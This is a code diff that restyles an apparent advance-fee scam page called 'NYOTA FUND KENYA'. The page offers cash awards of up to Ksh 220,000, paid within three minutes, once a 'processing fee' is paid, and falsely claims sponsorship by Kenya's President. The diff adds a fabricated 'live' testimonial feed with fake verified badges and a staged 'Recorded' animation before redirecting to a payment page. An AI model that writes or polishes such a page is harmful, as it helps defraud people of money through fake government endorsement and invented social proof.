@@ -25,6 +25,209 @@
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
   <script src="firebase-config.js"></script>
+  <style>
+    /* Add basic reset and container styles in case style.css is missing some */
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f4f7f6;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      background: #fff;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      padding-bottom: 40px;
+    }
+    .fund-buttons button {
+      padding: 15px;
+      margin: 5px;
+      border: none;
+      border-radius: 8px;background-color: #4a90e2;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      width: calc(50% - 14px);
+      transition: all 0.2s ease;
+    }
+    .fund-buttons button:focus, .fund-buttons button:active {
+      background-color: #1a56db;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+    }
+    
+    .payment-section {
+      background: #eaf3ff;
+      border: 1px solid #cce0ff;
+      border-radius: 12px;
+      padding: 20px;
+      margin-top: 20px;
+      text-align: left;
+    }
+    .payment-section p {
+      margin: 10px 0;display: flex;
+      justify-content: space-between;
+      border-bottom: 1px dotted #ccc;
+      padding-bottom: 10px;
+    }
+    .payment-section p:last-child {
+      border-bottom: none;
+      padding-bottom: 0;
+    }
+    .payment-section span {
+      font-weight: bold;
+    }
+    .payment-section .amount-value { color: #0f9d58; }
+    .payment-section .fee-value { color: #d0021b; }
+    .btn-continue {
+      width: 100%;
+      padding: 16px;
+      background-color: #28a745;color: white;
+      font-size: 18px;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      margin-top: 15px;
+      cursor: pointer;
+    }
+    .arrival-notice {
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+      margin-top: 10px;
+    }
+    /* Live Feed Styles */
+    .live-feed-container {
+      margin-top: 40px;
+      background: #f8f9fa;
+      border-radius: 16px;
+      overflow: hidden;
+      border: 1px solid #e1e4e8;.live-feed-header {
+      background: linear-gradient(135deg, #1a2a6c, #112240, #2b5876);
+      color: white;
+      padding: 15px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .live-feed-title {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .live-feed-title-icon {
+      background: rgba(255,255,255,0.2);
+      padding: 8px;
+      border-radius: 50%;
+      display: flex;
+    }
+    .live-feed-title h3 {
+      margin: 0;
+      font-size: 16px;
+    }.live-feed-title p {
+      margin: 2px 0 0 0;
+      font-size: 11px;
+      color: #b0c4de;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .live-feed-title p::before {
+      content: "";
+      display: inline-block;
+      width: 6px;
+      height: 6px;
+      background: #28a745;
+      border-radius: 50%;
+    }
+    .live-badge {
+      background: rgba(255,255,255,0.1);
+      padding: 4px 10px;
+      border-radius: 12px;
+      font-size: 11px;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }.live-badge::before {
+      content: "";
+      display: inline-block;
+      width: 8px;
+      height: 8px;
+      background: #ff4757;
+      border-radius: 50%;
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.2); opacity: 0.5; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .comments-box {
+      height: 350px;
+      overflow-y: hidden;
+      padding: 15px;
+      position: relative;
+    }
+  .comment {
+      background: white;
+      border-radius: 12px;
+      padding: 15px;
+      margin-bottom: 12px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+      display: flex;
+      gap: 12px;
+    }
+    .comment-avatar {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+      flex-shrink: 0;
+    }
+    .comment-content {
+      flex: 1;
+    }.comment-name {
+      font-weight: bold;
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      margin-bottom: 4px;
+    }
+    .comment-verified {
+      color: #999;
+      font-size: 11px;
+      font-weight: normal;
+      display: flex;
+      align-items: center;
+    }
+    
+    .comment-verified::before {
+      content: "✓";
+      display: inline-block;
+      margin-right: 2px;
+    }
+    .comment-text {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 6px;
+      line-height: 1.4;
+    }.comment-time {
+      font-size: 11px;
+      color: #999;
+    }
+  </style>
 </head>
 <body>
 
@@ -39,7 +242,7 @@
     ⬇️⬇️⬇️
   </p>
 
-  <ul style="font-size:18px; line-height:1.8;">
+  <ul style="font-size:18px; line-height:1.8; padding-left: 20px;">
     <li>1. Ksh22,000 — processing fee is <strong>Ksh1</strong></li>
     <li>2. Ksh32,300 — processing fee is <strong>Ksh290</strong></li>
     <li>3. Ksh43,800 — processing fee is <strong>Ksh330</strong></li>
@@ -60,42 +263,63 @@
     REMEMBER YOU WILL RECEIVE YOUR NYOTA FUND IN LESS THAN 3 MINUTES AFTER PAYING IT'S PROCESSING FEE.
   </p>
 
-  <p>
-    NYOTA FUND KENYA sponsored by
-    <strong>WILLIAM SAMOEI RUTO</strong>, President of Kenya 🇰🇪
+  <p style="font-size: 14px; color: #555;">
+    Sponsored by
+    <strong>H.E. William Samoei Ruto</strong>, President of Kenya 🇰🇪 · 2025–2026 Youth Strategy
   </p>
 
   <hr>
+  
+  <p style="font-weight:bold; text-align: center; font-size: 18px; margin-top: 20px; color: #28a745;">CHOOSE YOUR FUND AWARD BELOW</p>
 
   <!-- Amount buttons -->
-  <div class="fund-buttons">
-  <button data-amount="22000" data-fee="1">Ksh 22,000</button>
-  <button data-amount="32300" data-fee="290">Ksh 32,300</button>
-  <button data-amount="43800" data-fee="330">Ksh 43,800</button>
-  <button data-amount="50000" data-fee="410">Ksh 50,000</button>
-  <button data-amount="93300" data-fee="490">Ksh 93,300</button>
-  <button data-amount="102000" data-fee="545">Ksh 102,000</button>
-  <button data-amount="150000" data-fee="600">Ksh 150,000</button>
-  <button data-amount="200000" data-fee="685">Ksh 200,000</button>
-  <button data-amount="220000" data-fee="710">Ksh 220,000</button>
+   <div class="fund-buttons" style="display: flex; flex-wrap: wrap; justify-content: space-between;">
+  <button data-amount="22000" data-fee="240">Ksh 22,000<br><span style="font-size:12px; font-weight:normal;">Fee: Ksh 240</span></button>
+  <button data-amount="32300" data-fee="290">Ksh 32,300<br><span style="font-size:12px; font-weight:normal;">Fee: Ksh 290</span></button>
+  <button data-amount="43800" data-fee="330">Ksh 43,800<br><span style="font-size:12px; font-weight:normal;">Fee: Ksh 330</span></button>
+   <button data-amount="50000" data-fee="410">Ksh 50,000<br><span style="font-size:12px; font-weight:normal;">Fee: Ksh 410</span></button>
+  <button data-amount="93300" data-fee="490">Ksh 93,300<br><span style="font-size:12px; font-weight:normal;">Fee: Ksh 490</span></button>
+  <button data-amount="102000" data-fee="545">Ksh 102,000<br><span style="font-size:12px; font-weight:normal;">Fee: Ksh 545</span></button>
+  <button data-amount="150000" data-fee="600">Ksh 150,000<br><span style="font-size:12px; font-weight:normal;">Fee: Ksh 600</span></button>
+  <button data-amount="200000" data-fee="685">Ksh 200,000<br><span style="font-size:12px; font-weight:normal;">Fee: Ksh 685</span></button>
+   <button data-amount="220000" data-fee="710">Ksh 220,000<br><span style="font-size:12px; font-weight:normal;">Fee: Ksh 710</span></button>
 </div>
 
-  <p style="font-size:20px; margin-top:15px;">
-  Amount to Receive:
-  <strong>Ksh <span id="selectedAmount">---</span></strong>
-</p>
-
-<p style="font-size:20px;">
-  It's Processing Fee:
-  <strong>Ksh <span id="processingFee">---</span></strong>
-</p>
-
-  <button onclick="continueToPayment()">Continue to Payment</button>
-
-  <!-- Comments -->
-  <h3 style="margin-top:30px;">Live Comments now</h3>
-  <div id="commentsBox" class="comments-box"></div>
-
+   <div id="paymentSection" class="payment-section">
+    <p style="font-size:16px;">
+      <span style="color:#666; font-weight:normal;">Amount to Receive</span>
+      <strong class="amount-value">Ksh <span id="selectedAmount">---</span></strong>
+    </p>
+    <p style="font-size:16px;">
+      <span style="color:#666; font-weight:normal;">Processing Fee</span>
+      <strong class="fee-value">Ksh <span id="processingFee">---</span></strong>
+    </p>
+  </div>
+  <button class="btn-continue" onclick="continueToPayment()">Continue to Payment →</button>
+  <p class="arrival-notice">⚡ Funds arrive in under 3 minutes after payment</p>
+  <!-- Live Comments -->
+  <div class="live-feed-container">
+    <div class="live-feed-header">
+      <div class="live-feed-title">
+        <div class="live-feed-title-icon">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+         <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+            <path d="M8 10h.01"></path><path d="M12 10h.01"></path><path d="M16 10h.01"></path>
+          </svg>
+        </div>
+        <div>
+          <h3>Live Community Feed</h3>
+          <p>Recipients sharing in real-time</p>
+        </div>
+      </div>
+      <div class="live-badge">LIVE</div>
+    </div>
+    <div id="commentsBox" class="comments-box">
+      <!-- Comments will be generated here by JS -->
+    </div>
+    <div style="text-align: center; padding: 10px; color: #999; font-size: 12px; background: white; border-top: 1px solid #eee;"><span style="display:inline-block; letter-spacing: 2px;">● ● ●</span> New recipients joining...
+    </div>
+  </div>
 </div>
 
 <script>
@@ -156,6 +380,9 @@ document.querySelectorAll(".fund-buttons button").forEach(btn => {
 
     // Save to localStorage
     localStorage.setItem("selectedFund", JSON.stringify(selectedFund));
+    
+    // Auto scroll below to the complete payment button
+    document.querySelector('.btn-continue').scrollIntoView({ behavior: 'smooth', block: 'center' });
   });
 });
 
@@ -168,8 +395,21 @@ function continueToPayment() {
   // Save to localStorage
   localStorage.setItem("selectedFund", JSON.stringify(selectedFund));
 
-  // Go to payment page
-  window.location.href = "payment1.html";
+  const btn = document.querySelector('.btn-continue');
+  btn.disabled = true;
+  btn.style.opacity = '0.8';
+  btn.innerHTML = '<span class="spinner" style="display:inline-block; width: 16px; height: 16px; border: 2px solid white; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; vertical-align: middle; margin-right: 8px;"></span> Recording...';
+
+  setTimeout(() => {
+    btn.innerHTML = '✓ Recorded';
+    btn.style.backgroundColor = '#1e7e34';
+    btn.style.opacity = '1';
+    
+    setTimeout(() => {
+      // Go to payment page
+      window.location.href = "payment1.html";
+    }, 1000);
+  }, 1500);
 }
 
 /* ================= COMMENTS & TESTIMONIES ================= */
